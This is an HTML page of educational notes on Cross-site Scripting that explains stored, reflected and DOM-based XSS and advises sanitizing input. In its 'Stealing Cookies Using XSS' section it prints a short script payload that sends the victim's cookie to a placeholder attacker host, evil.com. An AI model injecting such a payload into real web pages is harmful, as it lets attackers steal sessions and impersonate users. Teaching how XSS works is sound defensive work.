I"ç<h3 id="overview">Overview</h3>
<p>Cross-site Scripting (XSS) is a client-side code injection attack. The attacker aims to execute malicious scripts in a web browser of the victim by including malicious code in a legitimate web page or web application. The actual attack occurs when the victim visits the web page or web application that executes the malicious code. The web page or web application becomes a vehicle to deliver the malicious script to the user‚Äôs browser. Vulnerable vehicles that are commonly used for Cross-site Scripting attacks are forums, message boards, and web pages that allow comments.
A web page or web application is vulnerable to XSS if it uses unsanitized user input in the output that it generates. This user input must then be parsed by the victim‚Äôs browser.</p>

<p><img src="../../../../img/TroyHunt/HackYourselfFirst/ch31.png" alt="alt text" /></p>

<p><img src="../../../../img/TroyHunt/HackYourselfFirst/ch32.png" alt="alt text" /></p>

<p><img src="../../../../img/TroyHunt/HackYourselfFirst/ch33.png" alt="alt text" /></p>

<p><img src="../../../../img/TroyHunt/HackYourselfFirst/ch34.png" alt="alt text" /></p>

<p><img src="../../../../img/TroyHunt/HackYourselfFirst/ch35.png" alt="alt text" /></p>

<p><img src="../../../../img/TroyHunt/HackYourselfFirst/ch36.png" alt="alt text" /></p>

<p><img src="../../../../img/TroyHunt/HackYourselfFirst/ch37.png" alt="alt text" /></p>

<p><img src="../../../../img/TroyHunt/HackYourselfFirst/ch38.png" alt="alt text" /></p>

<h3 id="isnt-cross-site-scripting-the-users-problem">‚ÄúIsn‚Äôt Cross-site Scripting the User‚Äôs Problem?‚Äù</h3>
<p>If an attacker can abuse an XSS vulnerability on a web page to execute arbitrary JavaScript in a user‚Äôs browser, the security of that vulnerable website or vulnerable web application and its users has been compromised. XSS is not the user‚Äôs problem like any other security vulnerability. If it is affecting your users, it affects you.</p>

<p>Cross-site Scripting may also be used to deface a website instead of targeting the user. The attacker can use injected scripts to change the content of the website or even redirect the browser to another web page, for example, one that contains malicious code.</p>

<h3 id="description">Description</h3>
<p>Cross-Site Scripting (XSS) attacks occur when:</p>

<p>1.Data enters a Web application through an untrusted source, most frequently a web request.</p>

<p>2.The data is included in dynamic content that is sent to a web user without being validated for malicious content.</p>

<p>The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash, or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data, like cookies or other session information, to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user‚Äôs machine under the guise of the vulnerable site.</p>

<h3 id="types-of-xss">Types of XSS</h3>
<p>While the goal of an XSS attack is always to execute malicious JavaScript in the victim‚Äôs browser, there are few fundamentally different ways of achieving that goal. XSS attacks are often divided into three types:
1.<strong>Persistent XSS</strong>, where the malicious string originates from the website‚Äôs database.</p>

<p>2.<strong>Reflected XSS</strong>, where the malicious string originates from the victim‚Äôs request.</p>

<p>3.<strong>DOM-based XSS</strong>, where the vulnerability is in the client-side code rather than the server-side code.</p>

<h4 id="stored-xss-attacks">Stored XSS Attacks</h4>
<p>Consider a web application that allows users to enter a username that is displayed on each user‚Äôs profile page. The application stores each username in a local database. A malicious user notices that the web application fails to sanitize the username field and inputs malicious JavaScript code as part of their username. When other users view the attacker‚Äôs profile page, the malicious code automatically executes in the context of their session</p>

<p>Refer to the example in <strong>Stealing Cookies Using XSS</strong></p>

<h4 id="reflected-xss-attacks">Reflected XSS Attacks</h4>
<p>In a reflected XSS attack, the malicious string is part of the victim‚Äôs request to the website. The website then includes this malicious string in the response sent back to the user. The diagram below illustrates this scenario:</p>

<p><img src="../../../../img/TroyHunt/HackYourselfFirst/reflected-xss.png" alt="alt text" /></p>

<p>1.The attacker crafts a URL containing a malicious string and sends it to the victim.</p>

<p>2.The victim is tricked by the attacker into requesting the URL from the website.</p>

<p>3.The website includes the malicious string from the URL in the response.</p>

<p>4.The victim‚Äôs browser executes the malicious script inside the response, sending the victim‚Äôs cookies to the attacker‚Äôs server.</p>

<h3 id="stealing-cookies-using-xss">Stealing Cookies Using XSS</h3>
<p>Criminals often use XSS to steal cookies. This allows them to impersonate the victim. The attacker can send the cookie to their own server in many ways. One of them is to execute the following client-side script in the victim‚Äôs browser:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;
window.location="http://evil.com/?cookie=" + document.cookie
&lt;/script&gt;
</code></pre></div></div>
<p>The figure below illustrates a step-by-step walkthrough of a simple XSS attack.
<strong>This example illustrated is a persistent XSS attack</strong></p>

<p><img src="../../../../img/TroyHunt/HackYourselfFirst/how-xss-works-910x404.png" alt="alt text" /></p>

<p>1.The attacker injects a payload into the website‚Äôs database by submitting a vulnerable form with malicious JavaScript content.</p>

<p>2.The victim requests the web page from the web server.</p>

<p>3.The web server serves the victim‚Äôs browser the page with attacker‚Äôs payload as part of the HTML body.</p>

<p>4.The victim‚Äôs browser executes the malicious script contained in the HTML body. In this case, it sends the victim‚Äôs cookie to the attacker‚Äôs server.</p>

<p>5.The attacker now simply needs to extract the victim‚Äôs cookie when the HTTP request arrives at the server.</p>

<p>6.The attacker can now use the victim‚Äôs stolen cookie for impersonation.</p>

<h3 id="how-to-prevent-xss">How to Prevent XSS</h3>
<p>To keep yourself safe from XSS, you must sanitize your input. Your application code should never output data received as input directly to the browser without checking it for malicious code</p>
:ET